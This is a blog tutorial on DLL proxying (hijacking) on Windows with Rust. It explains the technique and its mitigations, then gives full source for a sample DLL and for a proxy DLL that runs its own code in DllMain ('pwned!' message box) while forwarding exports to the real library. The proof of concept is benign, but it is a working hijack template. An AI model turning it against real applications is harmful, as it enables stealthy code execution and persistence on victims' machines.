---
title: "DLL proxying with Rust"
date: "2023-11-23"
draft: "false"
---

# DLL proxying with Rust
## what is dll proxying?
DLL proxying, also known as DLL redirection or DLL hijacking, is a technique used by attackers or developers to manipulate the way Windows loads dynamic link libraries (DLLs). DLLs are files that contain code and data that multiple programs can use simultaneously. They provide a way to modularize code and promote code reuse.

DLL proxying involves placing a malicious or modified DLL in a location that is searched by a target application before the legitimate DLL is located. When the application attempts to load a DLL, the operating system searches for the DLL in a specific order, including the application's directory, the system directories, and directories listed in the system's PATH environment variable. If a DLL with the same name is found in one of these directories, it may be loaded instead of the intended DLL.

This technique can be exploited for various purposes:

Malicious Activities: Attackers may use DLL proxying to replace a legitimate DLL with a malicious one, allowing them to execute arbitrary code, gain unauthorized access, or perform other malicious activities.

Debugging and Testing: Developers might use DLL proxying during debugging or testing to replace standard DLLs with custom versions to observe and manipulate the behavior of a program.

To mitigate the risks associated with DLL proxying, it's essential to follow security best practices, such as:

Use Secure Locations: Place DLLs in secure locations, and avoid placing them in directories that are writable by standard users.

Use Digital Signatures: Digitally sign DLLs to ensure their authenticity. This helps prevent the loading of tampered or malicious DLLs.

Update Software: Keep software and operating systems up-to-date to benefit from security patches that address known vulnerabilities.

Security Software: Employ security software that can detect and prevent DLL proxying attacks.

Microsoft has also introduced various security features and best practices to minimize the risk of DLL attacks, and developers should adhere to these guidelines to ensure the security of their applications.

## Legit DLL
https://github.com/famasoon/legitdll

`cargo.toml`

```
[package]
name = "legitdll"
version = "0.1.0"
edition = "2021"

# See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html

[dependencies]
winapi = {version="0.3.9", features = ["winuser"]}

[lib]
name = "legitdll"
crate-type = ["cdylib"]
```

`src/lib.rs`

```
use winapi::um::winuser::MessageBoxA;

#[no_mangle]
pub unsafe extern "C" fn legitfunction() {
    MessageBoxA(
        std::ptr::null_mut(),
        "Hello from legitfunction!\0".as_ptr()as *const i8 ,
        "Hello\0".as_ptr() as *const i8,
        0,
    );
}
```

This dll popup Hello message on MessageBox.

And `cargo build --release` output place sample `"C:\Users\81908\work\legitdll\target\release\legitdll.dll"`

## Proxying DLL
https://github.com/famasoon/proxy_dll

`cargo.toml`

```
[package]
name = "testdll"
version = "0.1.0"
edition = "2021"

# See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html

[dependencies]
winapi = {version="0.3.9",features = ["winuser"]}
forward-dll = "0.1.5"

[lib]
name = "mydll"
crate-type = ["cdylib"]
```

`src/lib.rs`


```
use forward_dll;
use winapi::um::winuser::MessageBoxA;
forward_dll::forward_dll!(
    r#"C:\Users\81908\work\legitdll\target\release\legitdll.dll"#,
    DLL_VERSION_FORWARDER,
    legitfunction
);
#[no_mangle]
pub unsafe extern "C" fn DllMain(size1: isize, reason: u32, lpvoid: *const u8) -> u32 {
    if reason == 1 {
        MessageBoxA(
            std::ptr::null_mut(),
            "this is from malicious dll\0".as_ptr() as *const i8,
            "pwned!\0".as_ptr() as *const i8,
            0,
        );
        let _ = forward_dll::utils::load_library(r#"C:\Users\81908\work\legitdll\target\release\legitdll.dll"#);
        let _ = DLL_VERSION_FORWARDER.forward_all();
        return 1;
    }
    return 1;
}
```

Build it, `cargo build --release`, and run it `rundll32.exe .\target\release\mydll.dll,legitfunction`
So we can pwn it!